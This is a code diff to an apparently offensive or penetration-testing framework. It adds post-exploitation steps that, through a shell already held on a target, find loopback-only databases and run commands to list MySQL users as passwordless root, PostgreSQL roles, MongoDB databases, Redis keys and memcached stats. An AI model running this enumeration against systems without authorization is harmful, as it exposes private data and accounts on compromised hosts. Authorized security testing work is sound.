@@ -2359,6 +2359,68 @@ def _harvest_shell_loot(sid, target: str, steps: list) -> dict:
     return out
 
 
+# Local (loopback-bound) DB services worth enumerating THROUGH a held shell —
+# they are unreachable externally, so an external scan never sees them, but a
+# shell can query them locally (often as root with no password). Read-only.
+_LOCAL_DB_PROBES = {
+    "mysql": {"ports": {3306}, "procs": ("mysql", "mariadb"), "cmds": [
+        ("db_mysql", "Local MySQL/MariaDB databases + users",
+         "mysql -u root -N -e 'SELECT version(); SHOW DATABASES; "
+         "SELECT user,host FROM mysql.user;' 2>&1 | head -80")]},
+    "postgres": {"ports": {5432}, "procs": ("postgres", "postmaster"), "cmds": [
+        ("db_postgres", "Local PostgreSQL databases + roles",
+         "(psql -U postgres -tAc 'SELECT version()' 2>&1; psql -U postgres -l 2>&1; "
+         "psql -U postgres -tAc 'SELECT rolname FROM pg_roles' 2>&1) | head -80")]},
+    "mongodb": {"ports": {27017}, "procs": ("mongod",), "cmds": [
+        ("db_mongo", "Local MongoDB databases",
+         "mongosh --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 "
+         "|| mongo --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 | head -60")]},
+    "redis": {"ports": {6379}, "procs": ("redis",), "cmds": [
+        ("db_redis", "Local Redis info + keys",
+         "(redis-cli INFO server 2>&1; redis-cli DBSIZE 2>&1; "
+         "redis-cli --scan 2>&1 | head -20) | head -80")]},
+    "memcached": {"ports": {11211}, "procs": ("memcached",), "cmds": [
+        ("db_memcached", "Local memcached stats",
+         "printf 'stats\\r\\nquit\\r\\n' | nc -w1 127.0.0.1 11211 2>&1 | head -40")]},
+}
+
+
+def _loopback_db_services(listen_out):
+    """DB service keys listening ONLY on loopback (127.x / ::1), from ss/netstat."""
+    import re as _re
+    found = {}
+    for line in (listen_out or "").splitlines():
+        line = _re.sub(r"^\S+@\S+:[^#]*#\s*", "", line).strip()
+        parts = line.split()
+        if len(parts) < 3 or not parts[0].isdigit() or ":" not in parts[2]:
+            continue
+        addr, _, ps = parts[2].rpartition(":")
+        if not ps.isdigit():
+            continue
+        al = addr.strip().lower().strip("[]")
+        if not (al.startswith("127.") or al in ("::1", "localhost")):
+            continue
+        port = int(ps)
+        pm = _re.search(r'users:\(\("([^"]+)"', line)
+        proc = (pm.group(1) if pm else "").lower()
+        for svc, spec in _LOCAL_DB_PROBES.items():
+            if port in spec["ports"] or any(t in proc for t in spec["procs"]):
+                found[svc] = port
+    return found
+
+
+def _enumerate_local_databases(out, run_step, listen_out):
+    """Run read-only local enumeration for any DB bound to loopback, through the
+    held shell. Appends to out['steps']; records which DBs were probed."""
+    dbs = _loopback_db_services(listen_out)
+    if not dbs:
+        return
+    out["local_databases"] = sorted(dbs.keys())
+    for svc in dbs:
+        for step_id, title, cmd in _LOCAL_DB_PROBES[svc]["cmds"]:
+            run_step(step_id, f"[local db] {title}", cmd)
+
+
 def _enumerate_through_best_access(sid, target: str) -> dict:
     """Run the methodology's post-access checklist through the BEST shell we hold.
 
@@ -2443,6 +2505,15 @@ def _enumerate_through_best_access(sid, target: str) -> dict:
             if not cmd or "{" in cmd:
                 continue
             _run_step(st["id"], st["title"], cmd)
+
+    # A database bound to loopback is unreachable externally — but we hold a
+    # shell, so enumerate it locally (read-only). Uses the "listen" output above.
+    try:
+        _listen = next((stp["output"] for stp in out["steps"]
+                        if stp.get("step") == "listen"), "")
+        _enumerate_local_databases(out, _run_step, _listen)
+    except Exception as e:  # noqa: BLE001
+        _log.debug("[%s] local-db enumeration skipped: %s", sid, e)
     return out
 
 
